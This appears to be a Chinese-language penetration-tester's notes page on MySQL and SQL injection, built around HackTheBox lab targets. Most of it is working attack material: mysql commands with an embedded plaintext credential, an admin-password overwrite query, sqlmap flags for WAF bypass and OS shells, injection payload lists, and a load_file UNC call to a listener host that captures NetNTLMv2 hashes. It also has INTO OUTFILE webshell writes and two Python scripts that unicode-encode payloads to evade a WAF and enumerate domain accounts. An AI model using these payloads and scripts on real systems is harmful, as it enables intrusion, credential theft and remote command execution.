MySQL 数据库服务的默认端口

mysql 链接
```mysql
sudo mysql -h <IP> -u<> -p
show databases;
use <database name>
show tables;
select * from <table name>

mysql -e 'show databases;' -u drupaluser -p'CQHEy@9M*m23gBVj'
mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
```

Login MySQL
```bash
mysql -h [ip] -u[username] -p -D[database]
```

Update (Replace) creds
- template
```mysql
UPDATE tblUsers SET pwd = 'e10adc3949ba59abbe56e057f20f883e' where login = 'admin' ;
```

**SQLMAP**
```
sqlmap -r request.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080

-r 指定bp抓包信息文档
--tamper=charunicodeescape 指定 tamper 脚本,使用默认的charunicodeescape绕过WAF  对所有字符进行 unicode 编码
--delay 5  每五秒一次请求 
--level 5 --risk 3  最大程度放宽
--proxy 当开启bp的时候 流量可以流过bp的拦截
--batch 使用sqlmap默认的选项
--force-ssl  扫描https网页强制开启ssl
--technique U   指定使用Union query
--privileges  列出当前用户的权限

--dbs
--dump-all 列出所有数据
--exclude-sysdbs 除了系统的数据库
--os-cmd 执行系统命令
--os-shell
```

##### SQL 注入
一定要检查细致 :    '    "    ')    ")     , 单引号前面的数据也有可能影响最后结果建议多写一点
```mysql
1' or '1'='1
'OR 1=1--
qwe' and 1=1 -- -
qwe' and 1=1; -- -
qwe' -- -
qwe' or 1=1; -- -
qwe' or 1=1 -- -
qwe' oR 1=1 -- -
qwe' || 1=1 -- -
qwe' && 1=1 -- -
qwe' union select 1,2,3,4,5,6; -- -
qwe' union select 1,2,3,4,5,6 -- -
0 or 1=1
0 or 1=2
123 union select 1,2,3,4,5;-- -
\u27     (尝试Escape Unicode Char >Cyber​​Chef<)
\u0027
\u0027\u0020\u006F\u0072\u0020\u0031\u003D\u0031\u003B\u002D\u002D\u0020\u002D  (' or 1=1;-- -)
qwe' union select 1,2,3,4,5 -- -
<username>' OR 1=1--
'OR '' = '	
<username>'--
' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
```

Bypass : 
```
qwe' || 1 #  (qwe' or 1 #)
```

### [重要]
-  **查看用户权限**           ' union select grantee,privilege_type,is_grantable,4,5,6 from information_schema.user_privileges #        
-  **获取内部 hash 值**   ' union select 1,user,password,4,5,6 from mysql.user #    
	使用 `hashcat -m 300`  来破解
-  **配合 responder 拿到 NetNTLMv2 Hash** :    `' union select 1,load_file('\\\\10.10.14.11\\test'),3 #`     
-  **读取主机中的文件** :    `' union select 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3 #`       

**脚本 （escape unicode char ）**  
```python
# 2024/03/06 基于 escape unicode 的sql注入 需要输入完整的SQL注入语句
# Like -> qwe' union all select 1,2,3,4,'Test'-- -
# Obsidian Hackthebox 0x30 is the example
import requests
import json
import cmd
  
url = "http://10.129.103.54/api/getColleagues" # ChangeThis

def encode(query):
    payload = ""
    for char in query:
        payload += r"\u{:04x}".format(ord(char))
    return payload

class exploit(cmd.Cmd):
    prompt = "PleaseSub > "
    def default(self, line):
        payload = encode(line)
        data = '{"name":"'+ payload +'"}'
        header = {"Content-Type":"application/json;charset=utf-8"}
        proxy = {"http":"127.0.0.1:8080"} # bp代理需要设置 
        r = requests.post(url, headers=header, proxies=proxy, data=data) # bp代理需要设置 
        print(r.text)
  
exploit().cmdloop()
```



**wfuzz 验证特殊符号过滤情况**
```bash
└─$ wfuzz -u http://10.129.103.54/api/getColleagues -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -t 1 -s 3

并发线程数为1
超时时间为3
```

**phpmyadmin 有漏洞的版本： version 4.9.0 - 4.9.1**  : [CMS 漏洞，攻击向量](../CMS%20漏洞，攻击向量.md)

**SQLi 写入 WebShell** :
```sql
select '<?php system($_GET[0]) ?>' into OUTFILE '/var/www/html/shell.php' ;
' union select '<?php system($_GET[\'cmd\']); ?>',2,3,4,5,6 into outfile 'C:/inetpub/wwwroot/xekoner.php' #
(注意要用 / 而不是 \)
```

# 域渗透

##### 手动 sql 注入转储域用户
https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
编码绕过方式根据实际情况确定      
**例**  > [0x30 Multimaster (SQL 注入枚举域内信息)](../../0x0B%20HackTheBox%20WP/靶机推荐第五组%2081-120暨内⽹和域渗透学习路径/0x30%20Multimaster%20(SQL 注入枚举域内信息).md) <
```
SELECT DEFAULT_DOMAIN() 获取域名
test' UNION ALL SELECT 51,DEFAULT_DOMAIN(),51,51,51-- SaIs
```

```
获取Domain Admins域的RID, 因为字符串回显原因，使用HEX返回
test' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator')),58-- SaIs
```
HEX : `0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`
所以可以拆分为 `0x0105000000000005150000001c00d1bcd181f1492bdfc236 f4 01 00 00`
反转字节后使用 python 转换格式：
```python
>>> 0x01f4
500
```
500 就是 Administrator 的 SID

**暴力枚举可能存在的用户 SID**
```python
#!/usr/bin/env python3       

import binascii
import requests
import struct
import sys
import time

payload_template = """test' UNION ALL SELECT 58,58,58,{},58-- -"""                                                         

def unicode_escape(s):                              
    return "".join([r"\u{:04x}".format(ord(c)) for c in s])


def issue_query(sql):                               
    while True:                                     
        resp = requests.post(
            "http://10.129.103.54/api/getColleagues", 
            data='{"name":"' + unicode_escape(payload_template.format(sql)) + '"}',
            headers={"Content-type": "text/json; charset=utf-8"},
            proxies={"http": "http://127.0.0.1:8080"},
        )                                           
        if resp.status_code != 403:
            break                                   
        sys.stdout.write("\r[-] Triggered WAF. Sleeping for 30 seconds")
        time.sleep(30)                              
    return resp.json()[0]["email"]


print("[*] Finding domain")
domain = issue_query("DEFAULT_DOMAIN()")
print(f"[+] Found domain: {domain}")

print("[*] Finding Domain SID")
sid = issue_query(f"master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\Domain Admins'))")[:-8]
print(f"[+] Found SID for {domain} domain: {sid}")
for i in range(500, 10500):
    sys.stdout.write(f"\r[*] Checking SID {i}" + " " * 50)
    num = binascii.hexlify(struct.pack("<I", i)).decode()
    acct = issue_query(f"SUSER_SNAME({sid}{num})")
    if acct:
        print(f"\r[+] Found account [{i:05d}]  {acct}" + " " * 30)
    time.sleep(1)

print("\r" + " " * 50)
```
